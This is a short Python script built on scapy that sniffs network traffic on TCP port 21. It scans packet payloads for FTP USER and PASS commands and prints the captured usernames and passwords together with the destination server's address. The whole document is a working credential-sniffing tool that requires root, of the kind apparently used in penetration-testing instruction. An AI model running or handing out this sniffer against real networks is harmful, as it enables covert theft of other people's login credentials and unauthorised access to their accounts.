#!/usr/bin/env python

import os
from scapy.all import *


def packetCallBack(packet):
    '''scans the payload of the TCP packet for
       ftp traffic for usernames and passwords.
    '''
    effteepea_packet = str(packet[TCP].payload)
    if "USER" in effteepea_packet or "PASS" in effteepea_packet:
        print "[=>] Server: %s" % packet[IP].dst
        print "[=>] %s" % packet[TCP].payload


if __name__ == '__main__':
    try:
        if os.getuid() == 0:
            print "[>] Sniffing traffic on port 21 for credentials....\n"
            sniff(filter='tcp port 21', prn=packetCallBack, store=0)
        else:
            print "[!] Please run this script as root."
    except Exception, e:
        print '[!] Error! %s' % e
